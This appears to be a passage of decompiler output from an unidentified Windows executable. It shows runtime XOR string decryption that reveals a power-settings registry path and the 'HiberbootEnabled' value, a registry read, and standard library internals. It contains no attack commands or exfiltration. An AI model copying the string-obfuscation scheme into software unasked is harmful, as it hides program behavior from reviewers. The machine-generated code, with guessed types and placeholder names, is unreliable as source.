// 1400D9D98: using guessed type char byte_1400D9D98;
// 1400D9D99: using guessed type char byte_1400D9D99;
// 1400D9D9A: using guessed type char byte_1400D9D9A;
// 1400D9D9B: using guessed type char byte_1400D9D9B;
// 1400D9D9C: using guessed type char byte_1400D9D9C;
// 1400D9D9D: using guessed type char byte_1400D9D9D;
// 1400D9D9E: using guessed type char byte_1400D9D9E;
// 1400D9D9F: using guessed type char byte_1400D9D9F;
// 1400D9DA0: using guessed type char byte_1400D9DA0;
// 1400D9DA1: using guessed type char byte_1400D9DA1;
// 1400D9DA2: using guessed type char byte_1400D9DA2;
// 1400D9DA3: using guessed type char byte_1400D9DA3;
// 1400D9DA4: using guessed type char byte_1400D9DA4;
// 1400D9DA5: using guessed type char byte_1400D9DA5;
// 1400D9DA6: using guessed type char byte_1400D9DA6;
// 1400D9DA7: using guessed type char byte_1400D9DA7;
// 1400D9DA8: using guessed type char byte_1400D9DA8;
// 1400D9DA9: using guessed type char byte_1400D9DA9;
// 1400D9DAA: using guessed type char byte_1400D9DAA;
// 1400D9DAB: using guessed type char byte_1400D9DAB;
// 1400D9DAC: using guessed type char byte_1400D9DAC;
// 1400D9DAD: using guessed type char byte_1400D9DAD;
// 1400D9DAE: using guessed type char byte_1400D9DAE;
// 1400D9DAF: using guessed type char byte_1400D9DAF;
// 1400D9DB0: using guessed type char byte_1400D9DB0;
// 1400D9DB1: using guessed type char byte_1400D9DB1;
// 1400D9DB2: using guessed type char byte_1400D9DB2;
// 1400D9DB3: using guessed type char byte_1400D9DB3;
// 1400D9DB4: using guessed type char byte_1400D9DB4;
// 1400D9DB5: using guessed type char byte_1400D9DB5;
// 1400D9DB6: using guessed type char byte_1400D9DB6;
// 1400D9DB7: using guessed type char byte_1400D9DB7;
// 1400D9DB8: using guessed type char byte_1400D9DB8;
// 1400D9DB9: using guessed type char byte_1400D9DB9;
// 1400D9DBA: using guessed type char byte_1400D9DBA;

//----- (0000000140015900) ----------------------------------------------------
_QWORD *__fastcall sub_140015900(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9DD4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9DD4 & 1 )
  {
    v5 = byte_1400D9DD0;
  }
  else
  {
    v4 = 69069 * dword_1400D9DC8 + 1234567;
    v1 = dword_1400D9DD4 | 1;
    dword_1400D9DC8 = v4;
    dword_1400D9DD4 |= 1u;
    dword_1400D9DC0 = HIWORD(dword_1400D9DC0) + 36969 * (unsigned __int16)dword_1400D9DC0;
    LOBYTE(v4) = (BYTE2(dword_1400D9DCC) + 80 * dword_1400D9DCC) ^ v4;
    dword_1400D9DCC = HIWORD(dword_1400D9DCC) + 18000 * (unsigned __int16)dword_1400D9DCC;
    v5 = (((unsigned int)dword_1400D9DC4 >> 13) ^ 32 * dword_1400D9DC4 ^ dword_1400D9DC4) + v4;
    dword_1400D9DC4 ^= ((unsigned int)dword_1400D9DC4 >> 13) ^ 32 * (dword_1400D9DC4 ^ (dword_1400D9DC4 << 12));
    byte_1400D9DD0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9DD4 = v1 | 2;
    byte_1400D9DD8[0] = v5 ^ 0x53;
    byte_1400D9DD9 = (v5 - 1) ^ 0x59;
    byte_1400D9DDA = (v5 - 2) ^ 0x53;
    byte_1400D9DDB = (v5 - 3) ^ 0x54;
    byte_1400D9DDC = (v5 - 4) ^ 0x45;
    byte_1400D9DDD = (v5 - 5) ^ 0x4D;
    byte_1400D9DDE = (v5 - 6) ^ 0x5C;
    byte_1400D9DDF = (v5 - 7) ^ 0x43;
    byte_1400D9DE0 = (v5 - 8) ^ 0x75;
    byte_1400D9DE1 = (v5 - 9) ^ 0x72;
    byte_1400D9DE2 = (v5 - 10) ^ 0x72;
    byte_1400D9DE3 = (v5 - 11) ^ 0x65;
    byte_1400D9DE4 = (v5 - 12) ^ 0x6E;
    byte_1400D9DE5 = (v5 - 13) ^ 0x74;
    byte_1400D9DE6 = (v5 - 14) ^ 0x43;
    byte_1400D9DE7 = (v5 - 15) ^ 0x6F;
    byte_1400D9DE8 = (v5 - 16) ^ 0x6E;
    byte_1400D9DE9 = (v5 - 17) ^ 0x74;
    byte_1400D9DEA = (v5 - 18) ^ 0x72;
    byte_1400D9DEB = (v5 - 19) ^ 0x6F;
    byte_1400D9DEC = (v5 - 20) ^ 0x6C;
    byte_1400D9DED = (v5 - 21) ^ 0x53;
    byte_1400D9DEE = (v5 - 22) ^ 0x65;
    byte_1400D9DEF = (v5 - 23) ^ 0x74;
    byte_1400D9DF0 = (v5 - 24) ^ 0x5C;
    byte_1400D9DF1 = (v5 - 25) ^ 0x43;
    byte_1400D9DF2 = (v5 - 26) ^ 0x6F;
    byte_1400D9DF3 = (v5 - 27) ^ 0x6E;
    byte_1400D9DF4 = (v5 - 28) ^ 0x74;
    byte_1400D9DF5 = (v5 - 29) ^ 0x72;
    byte_1400D9DF6 = (v5 - 30) ^ 0x6F;
    byte_1400D9DF7 = (v5 - 31) ^ 0x6C;
    byte_1400D9DF8 = (v5 - 32) ^ 0x5C;
    byte_1400D9DF9 = (v5 - 33) ^ 0x53;
    byte_1400D9DFA = (v5 - 34) ^ 0x65;
    byte_1400D9DFB = (v5 - 35) ^ 0x73;
    byte_1400D9DFC = (v5 - 36) ^ 0x73;
    byte_1400D9DFD = (v5 - 37) ^ 0x69;
    byte_1400D9DFE = (v5 - 38) ^ 0x6F;
    byte_1400D9DFF = (v5 - 39) ^ 0x6E;
    byte_1400D9E00 = (v5 - 40) ^ 0x20;
    byte_1400D9E01 = (v5 - 41) ^ 0x4D;
    byte_1400D9E02 = (v5 - 42) ^ 0x61;
    byte_1400D9E03 = (v5 - 43) ^ 0x6E;
    byte_1400D9E04 = (v5 - 44) ^ 0x61;
    byte_1400D9E05 = (v5 - 45) ^ 0x67;
    byte_1400D9E06 = (v5 - 46) ^ 0x65;
    byte_1400D9E07 = (v5 - 47) ^ 0x72;
    byte_1400D9E08 = (v5 - 48) ^ 0x5C;
    byte_1400D9E09 = (v5 - 49) ^ 0x50;
    byte_1400D9E0A = (v5 - 50) ^ 0x6F;
    byte_1400D9E0B = (v5 - 51) ^ 0x77;
    byte_1400D9E0C = (v5 - 52) ^ 0x65;
    byte_1400D9E0D = (v5 - 53) ^ 0x72;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x36ui64 )
  {
    sub_140004790(Src, 0x36ui64, 0i64);
    v5 = byte_1400D9DD0;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  v6[5] = 0i64;
  *((_DWORD *)v6 + 12) = 0;
  *((_WORD *)v6 + 26) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 54i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 54) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9DD8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x36 );
  return v3;
}
// 1400D9DC0: using guessed type int dword_1400D9DC0;
// 1400D9DC4: using guessed type int dword_1400D9DC4;
// 1400D9DC8: using guessed type int dword_1400D9DC8;
// 1400D9DCC: using guessed type int dword_1400D9DCC;
// 1400D9DD0: using guessed type char byte_1400D9DD0;
// 1400D9DD4: using guessed type int dword_1400D9DD4;
// 1400D9DD9: using guessed type char byte_1400D9DD9;
// 1400D9DDA: using guessed type char byte_1400D9DDA;
// 1400D9DDB: using guessed type char byte_1400D9DDB;
// 1400D9DDC: using guessed type char byte_1400D9DDC;
// 1400D9DDD: using guessed type char byte_1400D9DDD;
// 1400D9DDE: using guessed type char byte_1400D9DDE;
// 1400D9DDF: using guessed type char byte_1400D9DDF;
// 1400D9DE0: using guessed type char byte_1400D9DE0;
// 1400D9DE1: using guessed type char byte_1400D9DE1;
// 1400D9DE2: using guessed type char byte_1400D9DE2;
// 1400D9DE3: using guessed type char byte_1400D9DE3;
// 1400D9DE4: using guessed type char byte_1400D9DE4;
// 1400D9DE5: using guessed type char byte_1400D9DE5;
// 1400D9DE6: using guessed type char byte_1400D9DE6;
// 1400D9DE7: using guessed type char byte_1400D9DE7;
// 1400D9DE8: using guessed type char byte_1400D9DE8;
// 1400D9DE9: using guessed type char byte_1400D9DE9;
// 1400D9DEA: using guessed type char byte_1400D9DEA;
// 1400D9DEB: using guessed type char byte_1400D9DEB;
// 1400D9DEC: using guessed type char byte_1400D9DEC;
// 1400D9DED: using guessed type char byte_1400D9DED;
// 1400D9DEE: using guessed type char byte_1400D9DEE;
// 1400D9DEF: using guessed type char byte_1400D9DEF;
// 1400D9DF0: using guessed type char byte_1400D9DF0;
// 1400D9DF1: using guessed type char byte_1400D9DF1;
// 1400D9DF2: using guessed type char byte_1400D9DF2;
// 1400D9DF3: using guessed type char byte_1400D9DF3;
// 1400D9DF4: using guessed type char byte_1400D9DF4;
// 1400D9DF5: using guessed type char byte_1400D9DF5;
// 1400D9DF6: using guessed type char byte_1400D9DF6;
// 1400D9DF7: using guessed type char byte_1400D9DF7;
// 1400D9DF8: using guessed type char byte_1400D9DF8;
// 1400D9DF9: using guessed type char byte_1400D9DF9;
// 1400D9DFA: using guessed type char byte_1400D9DFA;
// 1400D9DFB: using guessed type char byte_1400D9DFB;
// 1400D9DFC: using guessed type char byte_1400D9DFC;
// 1400D9DFD: using guessed type char byte_1400D9DFD;
// 1400D9DFE: using guessed type char byte_1400D9DFE;
// 1400D9DFF: using guessed type char byte_1400D9DFF;
// 1400D9E00: using guessed type char byte_1400D9E00;
// 1400D9E01: using guessed type char byte_1400D9E01;
// 1400D9E02: using guessed type char byte_1400D9E02;
// 1400D9E03: using guessed type char byte_1400D9E03;
// 1400D9E04: using guessed type char byte_1400D9E04;
// 1400D9E05: using guessed type char byte_1400D9E05;
// 1400D9E06: using guessed type char byte_1400D9E06;
// 1400D9E07: using guessed type char byte_1400D9E07;
// 1400D9E08: using guessed type char byte_1400D9E08;
// 1400D9E09: using guessed type char byte_1400D9E09;
// 1400D9E0A: using guessed type char byte_1400D9E0A;
// 1400D9E0B: using guessed type char byte_1400D9E0B;
// 1400D9E0C: using guessed type char byte_1400D9E0C;
// 1400D9E0D: using guessed type char byte_1400D9E0D;

//----- (0000000140015D20) ----------------------------------------------------
_QWORD *__fastcall sub_140015D20(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9E10;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9E10 & 1 )
  {
    v5 = byte_1400D9E0E;
  }
  else
  {
    v4 = 69069 * dword_1400D9DC8 + 1234567;
    v1 = dword_1400D9E10 | 1;
    dword_1400D9DC8 = v4;
    dword_1400D9E10 |= 1u;
    dword_1400D9DC0 = HIWORD(dword_1400D9DC0) + 36969 * (unsigned __int16)dword_1400D9DC0;
    LOBYTE(v4) = (BYTE2(dword_1400D9DCC) + 80 * dword_1400D9DCC) ^ v4;
    dword_1400D9DCC = HIWORD(dword_1400D9DCC) + 18000 * (unsigned __int16)dword_1400D9DCC;
    v5 = (((unsigned int)dword_1400D9DC4 >> 13) ^ 32 * dword_1400D9DC4 ^ dword_1400D9DC4) + v4;
    dword_1400D9DC4 ^= ((unsigned int)dword_1400D9DC4 >> 13) ^ 32 * (dword_1400D9DC4 ^ (dword_1400D9DC4 << 12));
    byte_1400D9E0E = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9E10 = v1 | 2;
    byte_1400D9E18[0] = v5 ^ 0x48;
    byte_1400D9E19 = (v5 - 1) ^ 0x69;
    byte_1400D9E1A = (v5 - 2) ^ 0x62;
    byte_1400D9E1B = (v5 - 3) ^ 0x65;
    byte_1400D9E1C = (v5 - 4) ^ 0x72;
    byte_1400D9E1D = (v5 - 5) ^ 0x62;
    byte_1400D9E1E = (v5 - 6) ^ 0x6F;
    byte_1400D9E1F = (v5 - 7) ^ 0x6F;
    byte_1400D9E20 = (v5 - 8) ^ 0x74;
    byte_1400D9E21 = (v5 - 9) ^ 0x45;
    byte_1400D9E22 = (v5 - 10) ^ 0x6E;
    byte_1400D9E23 = (v5 - 11) ^ 0x61;
    byte_1400D9E24 = (v5 - 12) ^ 0x62;
    byte_1400D9E25 = (v5 - 13) ^ 0x6C;
    byte_1400D9E26 = (v5 - 14) ^ 0x65;
    byte_1400D9E27 = (v5 - 15) ^ 0x64;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x10ui64 && (sub_140004790(Src, 0x10ui64, 0i64), v5 = byte_1400D9E0E, v3[3] < 0x10ui64) )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 16i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 16) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9E18[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x10 );
  return v3;
}
// 1400D9DC0: using guessed type int dword_1400D9DC0;
// 1400D9DC4: using guessed type int dword_1400D9DC4;
// 1400D9DC8: using guessed type int dword_1400D9DC8;
// 1400D9DCC: using guessed type int dword_1400D9DCC;
// 1400D9E0E: using guessed type char byte_1400D9E0E;
// 1400D9E10: using guessed type int dword_1400D9E10;
// 1400D9E19: using guessed type char byte_1400D9E19;
// 1400D9E1A: using guessed type char byte_1400D9E1A;
// 1400D9E1B: using guessed type char byte_1400D9E1B;
// 1400D9E1C: using guessed type char byte_1400D9E1C;
// 1400D9E1D: using guessed type char byte_1400D9E1D;
// 1400D9E1E: using guessed type char byte_1400D9E1E;
// 1400D9E1F: using guessed type char byte_1400D9E1F;
// 1400D9E20: using guessed type char byte_1400D9E20;
// 1400D9E21: using guessed type char byte_1400D9E21;
// 1400D9E22: using guessed type char byte_1400D9E22;
// 1400D9E23: using guessed type char byte_1400D9E23;
// 1400D9E24: using guessed type char byte_1400D9E24;
// 1400D9E25: using guessed type char byte_1400D9E25;
// 1400D9E26: using guessed type char byte_1400D9E26;
// 1400D9E27: using guessed type char byte_1400D9E27;

//----- (0000000140016030) ----------------------------------------------------
__int64 __fastcall sub_140016030(__int64 a1, HKEY a2, __int64 a3, const CHAR *a4, DWORD Type)
{
  char v5; // si
  const CHAR *v6; // rdi
  __int64 v7; // rbx
  REGSAM v8; // er9
  const CHAR *v9; // rax
  bool v10; // cf
  const CHAR *v11; // rdx
  DWORD cbData; // [rsp+30h] [rbp-28h]
  HKEY hKey; // [rsp+38h] [rbp-20h]
  int Data; // [rsp+70h] [rbp+18h]

  v5 = 0;
  v6 = a4;
  v7 = a1;
  v8 = 1;
  v9 = (const CHAR *)a3;
  if ( (_BYTE)Type )
    v8 = 257;
  v10 = *(_QWORD *)(a3 + 24) < 0x10ui64;
  Data = 0;
  hKey = 0i64;
  if ( !v10 )
    v9 = *(const CHAR **)a3;
  if ( RegOpenKeyExA(a2, v9, 0, v8, &hKey) )
  {
    *(_BYTE *)v7 = 0;
  }
  else
  {
    v10 = *((_QWORD *)v6 + 3) < 0x10ui64;
    Type = 0;
    if ( v10 )
      v11 = v6;
    else
      v11 = *(const CHAR **)v6;
    if ( !RegQueryValueExA(hKey, v11, 0i64, &Type, 0i64, 0i64) && Type == 4 )
    {
      v10 = *((_QWORD *)v6 + 3) < 0x10ui64;
      cbData = 4;
      if ( !v10 )
        v6 = *(const CHAR **)v6;
      v5 = 0;
      if ( !RegQueryValueExA(hKey, v6, 0i64, 0i64, (LPBYTE)&Data, &cbData) )
        v5 = 1;
    }
    RegCloseKey(hKey);
    *(_BYTE *)v7 = v5;
  }
  *(_DWORD *)(v7 + 4) = Data;
  return v7;
}

//----- (0000000140016160) ----------------------------------------------------
_QWORD *__fastcall sub_140016160(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  _QWORD *result; // rax

  v2 = a2;
  result = sub_14001BDB0(a1);
  *((_WORD *)result + 12) = 0;
  if ( result != (_QWORD *)-32i64 )
    result[4] = *v2;
  return result;
}

//----- (00000001400161A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400161A0(_QWORD *a1, __int64 a2, _DWORD **a3)
{
  _DWORD **v3; // rbx
  _QWORD *result; // rax

  v3 = a3;
  result = sub_14001BE10(a1);
  *((_WORD *)result + 12) = 0;
  if ( result != (_QWORD *)-32i64 )
  {
    *((_DWORD *)result + 8) = **v3;
    result[5] = 0i64;
  }
  return result;
}

//----- (00000001400161F0) ----------------------------------------------------
void __fastcall sub_1400161F0(void *Src, char *a2, char *a3)
{
  _QWORD *v3; // rbx
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rdi
  _WORD *v6; // rax
  __int16 v7; // r14
  __int64 v8; // r8
  unsigned __int64 v9; // rdi
  unsigned __int64 v10; // rax
  _WORD *v11; // rax
  _QWORD *v12; // rax
  _QWORD *v13; // rax
  char *v14; // [rsp+68h] [rbp+10h]
  char *v15; // [rsp+70h] [rbp+18h]

  v15 = a3;
  v14 = a2;
  v3 = Src;
  v4 = a3 - a2;
  v5 = *((_QWORD *)Src + 2);
  if ( v5 <= a3 - a2 && *((_QWORD *)Src + 3) != v4 && sub_140004A90((__int64 *)Src, v4, 1) )
  {
    v3[2] = v5;
    if ( v3[3] < 8ui64 )
      v6 = v3;
    else
      v6 = (_WORD *)*v3;
    v6[v5] = 0;
  }
  while ( v14 != v15 )
  {
    v7 = *v14;
    v8 = v3[2];
    if ( (unsigned __int64)(-1 - v8) <= 1 )
      std::_Xlength_error("string too long");
    v9 = v8 + 1;
    if ( (unsigned __int64)(v8 + 1) > 0x7FFFFFFFFFFFFFFEi64 )
      std::_Xlength_error("string too long");
    v10 = v3[3];
    if ( v10 < v9 )
    {
      sub_1400048A0(v3, v9, v8);
      if ( !v9 )
        goto LABEL_28;
LABEL_21:
      if ( v3[3] < 8ui64 )
        v12 = v3;
      else
        v12 = (_QWORD *)*v3;
      *((_WORD *)v12 + v3[2]) = v7;
      v3[2] = v9;
      if ( v3[3] < 8ui64 )
        v13 = v3;
      else
        v13 = (_QWORD *)*v3;
      *((_WORD *)v13 + v9) = 0;
      goto LABEL_28;
    }
    if ( v9 )
      goto LABEL_21;
    v3[2] = 0i64;
    if ( v10 < 8 )
      v11 = v3;
    else
      v11 = (_WORD *)*v3;
    *v11 = 0;
LABEL_28:
    ++v14;
  }
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140016340) ----------------------------------------------------
_QWORD *__fastcall sub_140016340(_QWORD *a1, _QWORD *a2, char a3, _QWORD *a4, _QWORD *a5)
{
  _QWORD *v5; // rdi
  char v6; // si
  _QWORD *v7; // r14
  _QWORD *v8; // rbx
  _QWORD *v9; // rax
  _QWORD *v10; // r9
  __int64 *v11; // rcx
  __int64 *v12; // r8
  __int64 *v13; // rdx
  __int64 v14; // rdx
  _QWORD *v15; // rdx
  _QWORD *v16; // rcx
  _QWORD *v17; // rdx
  _QWORD *v18; // r8
  __int64 v19; // rcx
  _QWORD *v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rcx
  __int64 v25; // rcx

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( a1[1] >= 0x666666666666665ui64 )
  {
    std::_Xlength_error("map/set<T> too long");
    __debugbreak();
  }
  v9 = sub_140016160(a1, a5);
  ++v8[1];
  v9[1] = v5;
  v10 = v9;
  if ( v5 == (_QWORD *)*v8 )
  {
    *(_QWORD *)(*v8 + 8i64) = v9;
    *(_QWORD *)*v8 = v9;
    *(_QWORD *)(*v8 + 16i64) = v9;
  }
  else if ( v6 )
  {
    *v5 = v9;
    if ( v5 == *(_QWORD **)*v8 )
      *(_QWORD *)*v8 = v9;
  }
  else
  {
    v5[2] = v9;
    if ( v5 == *(_QWORD **)(*v8 + 16i64) )
      *(_QWORD *)(*v8 + 16i64) = v9;
  }
  while ( !*(_BYTE *)(v9[1] + 24i64) )
  {
    v11 = (__int64 *)v9[1];
    v12 = (__int64 *)v11[1];
    v13 = (__int64 *)*v12;
    if ( v11 == (__int64 *)*v12 )
    {
      v14 = v12[2];
      if ( *(_BYTE *)(v14 + 24) )
      {
        if ( v9 == (_QWORD *)v11[2] )
        {
          v15 = (_QWORD *)v11[2];
          v9 = (_QWORD *)v9[1];
          v11[2] = *v15;
          if ( !*(_BYTE *)(*v15 + 25i64) )
            *(_QWORD *)(*v15 + 8i64) = v11;
          v15[1] = v11[1];
          if ( v11 == *(__int64 **)(*v8 + 8i64) )
          {
            *(_QWORD *)(*v8 + 8i64) = v15;
          }
          else
          {
            v16 = (_QWORD *)v11[1];
            if ( v9 == (_QWORD *)*v16 )
              *v16 = v15;
            else
              v16[2] = v15;
          }
          *v15 = v9;
          v9[1] = v15;
        }
        *(_BYTE *)(v9[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v9[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v9[1] + 8i64);
        v18 = (_QWORD *)*v17;
        *v17 = *(_QWORD *)(*v17 + 16i64);
        v19 = v18[2];
        if ( !*(_BYTE *)(v19 + 25) )
          *(_QWORD *)(v19 + 8) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v8 + 8i64) )
        {
          *(_QWORD *)(*v8 + 8i64) = v18;
          v18[2] = v17;
        }
        else
        {
          v20 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)v20[2] )
            v20[2] = v18;
          else
            *v20 = v18;
          v18[2] = v17;
        }
LABEL_50:
        v17[1] = v18;
        continue;
      }
      *((_BYTE *)v11 + 24) = 1;
      *(_BYTE *)(v14 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v9[1] + 8i64) + 24i64) = 0;
      v9 = *(_QWORD **)(v9[1] + 8i64);
    }
    else
    {
      if ( *((_BYTE *)v13 + 24) )
      {
        if ( v9 == (_QWORD *)*v11 )
        {
          v21 = *v11;
          v9 = (_QWORD *)v9[1];
          *v11 = *(_QWORD *)(*v11 + 16);
          v22 = *(_QWORD *)(v21 + 16);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v9;
          *(_QWORD *)(v21 + 8) = v9[1];
          if ( v9 == *(_QWORD **)(*v8 + 8i64) )
          {
            *(_QWORD *)(*v8 + 8i64) = v21;
          }
          else
          {
            v23 = (_QWORD *)v9[1];
            if ( v9 == (_QWORD *)v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *(_QWORD *)(v21 + 16) = v9;
          v9[1] = v21;
        }
        *(_BYTE *)(v9[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v9[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v9[1] + 8i64);
        v18 = (_QWORD *)v17[2];
        v17[2] = *v18;
        if ( !*(_BYTE *)(*v18 + 25i64) )
          *(_QWORD *)(*v18 + 8i64) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v8 + 8i64) )
        {
          *(_QWORD *)(*v8 + 8i64) = v18;
        }
        else
        {
          v24 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)*v24 )
            *v24 = v18;
          else
            v24[2] = v18;
        }
        *v18 = v17;
        goto LABEL_50;
      }
      *((_BYTE *)v11 + 24) = 1;
      *((_BYTE *)v13 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v9[1] + 8i64) + 24i64) = 0;
      v9 = *(_QWORD **)(v9[1] + 8i64);
    }
  }
  v25 = *(_QWORD *)(*v8 + 8i64);
  *v7 = v10;
  *(_BYTE *)(v25 + 24) = 1;
  return v7;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140016610) ----------------------------------------------------
_QWORD *__usercall sub_140016610@<rax>(void *a1@<rcx>, _QWORD *a2@<rdx>, __int64 *a3@<r8>, unsigned int *a4@<r9>, __int64 a5)
{
  unsigned int *v5; // r10
  _QWORD *v6; // rbx
  _QWORD *v7; // r11
  __int64 **v9; // rcx
  __int64 v10; // ST20_8
  __int64 *v11; // r9
  __int64 *v12; // r9
  unsigned int v13; // esi
  bool v14; // cf
  __int64 *v15; // rax
  __int64 *v16; // r9
  __int64 *j; // rax
  __int64 *i; // rdx
  __int64 *v19; // r9
  __int64 *v20; // r9
  __int64 **v21; // rax
  __int64 *l; // rax
  __int64 *k; // rax
  char v24; // [rsp+38h] [rbp-20h]

  v5 = a4;
  v6 = a2;
  v7 = a1;
  if ( !*((_QWORD *)a1 + 1) )
  {
    LOBYTE(a3) = 1;
    sub_140077970(a1, a2, a3, *(_QWORD **)a1, (__int64)a4, (_QWORD *)a5);
    return v6;
  }
  v9 = *(__int64 ***)a1;
  if ( a3 == *v9 )
  {
    if ( *a4 < *((_DWORD *)a3 + 8) )
    {
      v10 = (__int64)a4;
      v11 = a3;
      LOBYTE(a3) = 1;
      sub_140077970(v7, a2, a3, v11, v10, (_QWORD *)a5);
      return v6;
    }
    goto LABEL_43;
  }
  if ( a3 == (__int64 *)v9 )
  {
    v12 = v9[2];
    if ( *((_DWORD *)v12 + 8) < *v5 )
    {
      sub_140077970(v7, a2, 0i64, v12, (__int64)v5, (_QWORD *)a5);
      return v6;
    }
    goto LABEL_43;
  }
  v13 = *a4;
  v14 = *((_DWORD *)a3 + 8) < *a4;
  if ( *((_DWORD *)a3 + 8) > *a4 )
  {
    v15 = a3;
    if ( *((_BYTE *)a3 + 25) )
    {
      v16 = (__int64 *)a3[2];
    }
    else
    {
      v16 = (__int64 *)*a3;
      if ( *(_BYTE *)(*a3 + 25) )
      {
        for ( i = (__int64 *)a3[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
        {
          if ( v15 != (__int64 *)*i )
            break;
          v15 = i;
        }
        v16 = v15;
        if ( !*((_BYTE *)v15 + 25) )
          v16 = i;
      }
      else
      {
        for ( j = (__int64 *)v16[2]; !*((_BYTE *)j + 25); j = (__int64 *)j[2] )
          v16 = j;
      }
    }
    if ( *((_DWORD *)v16 + 8) < v13 )
    {
      if ( *(_BYTE *)(v16[2] + 25) )
      {
        sub_140077970(v7, v6, 0i64, v16, (__int64)v5, (_QWORD *)a5);
      }
      else
      {
        v19 = a3;
        LOBYTE(a3) = 1;
        sub_140077970(v7, v6, a3, v19, (__int64)v5, (_QWORD *)a5);
      }
      return v6;
    }
    v14 = *((_DWORD *)a3 + 8) < v13;
  }
  if ( !v14 )
    goto LABEL_43;
  v20 = a3;
  if ( !*((_BYTE *)a3 + 25) )
  {
    v21 = (__int64 **)a3[2];
    if ( *((_BYTE *)v21 + 25) )
    {
      for ( k = (__int64 *)a3[1]; !*((_BYTE *)k + 25); k = (__int64 *)k[1] )
      {
        if ( v20 != (__int64 *)k[2] )
          break;
        v20 = k;
      }
      v20 = k;
    }
    else
    {
      v20 = (__int64 *)a3[2];
      for ( l = *v21; !*((_BYTE *)l + 25); l = (__int64 *)*l )
        v20 = l;
    }
  }
  if ( v20 != (__int64 *)v9 && v13 >= *((_DWORD *)v20 + 8) )
  {
LABEL_43:
    *v6 = *(_QWORD *)sub_140016870(v7, (__int64)&v24, 0i64, v5, (void *)a5);
    return v6;
  }
  if ( *(_BYTE *)(a3[2] + 25) )
  {
    sub_140077970(v7, v6, 0i64, a3, (__int64)v5, (_QWORD *)a5);
  }
  else
  {
    LOBYTE(a3) = 1;
    sub_140077970(v7, v6, a3, v20, (__int64)v5, (_QWORD *)a5);
  }
  return v6;
}

//----- (0000000140016870) ----------------------------------------------------
__int64 __fastcall sub_140016870(void *a1, __int64 a2, void *a3, unsigned int *a4, void *a5)
{
  unsigned int *v5; // rsi
  char v6; // r10
  __int64 v7; // rdi
  __int64 *v8; // rax
  __int64 *v9; // r9
  unsigned int v10; // edx
  __int64 *v11; // rbx
  __int64 *j; // rax
  __int64 *i; // rax
  int v15; // [rsp+50h] [rbp+8h]

  v5 = a4;
  v6 = (char)a3;
  v7 = a2;
  v8 = *(__int64 **)(*(_QWORD *)a1 + 8i64);
  v9 = *(__int64 **)a1;
  LOBYTE(a3) = 1;
  if ( !*((_BYTE *)v8 + 25) )
  {
    v10 = *v5;
    do
    {
      v9 = v8;
      if ( v6 )
        LOBYTE(a3) = *((_DWORD *)v8 + 8) >= v10;
      else
        LOBYTE(a3) = v10 < *((_DWORD *)v8 + 8);
      if ( (_BYTE)a3 )
        v8 = (__int64 *)*v8;
      else
        v8 = (__int64 *)v8[2];
    }
    while ( !*((_BYTE *)v8 + 25) );
  }
  v11 = v9;
